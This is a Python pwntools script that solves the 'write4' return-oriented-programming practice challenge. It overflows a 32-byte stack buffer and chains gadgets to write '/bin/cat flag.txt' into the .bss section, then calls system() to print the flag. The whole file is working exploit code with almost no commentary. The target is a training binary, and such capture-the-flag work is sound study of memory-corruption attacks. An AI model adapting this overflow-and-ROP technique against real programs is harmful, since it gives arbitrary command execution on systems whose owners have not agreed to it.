"""
rbp-0x20 <= buffer[0x20]

.bss = 0x601060

"""

from pwn import *

elf = ELF("./write4")
p = process("./write4")

bss = 0x601060

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x400893 + 1 )  #ret
command = b'/bin/cat flag.txt\0'
for i in range( 0, len(command), 8 ):
    payload += p64( 0x400890 ) #pop r14;pop r15;ret
    payload += p64( bss+i ) 
    payload += command[i:i+8].ljust(8, b'\0')
    payload += p64( elf.symbols["usefulGadgets"] )
payload += p64( 0x400893 ) #pop rdi
payload += p64( bss )
payload += p64( elf.plt["system"] )

p.recvuntil("> ")
p.sendline( payload )
info("flag :%s", p.recv() )

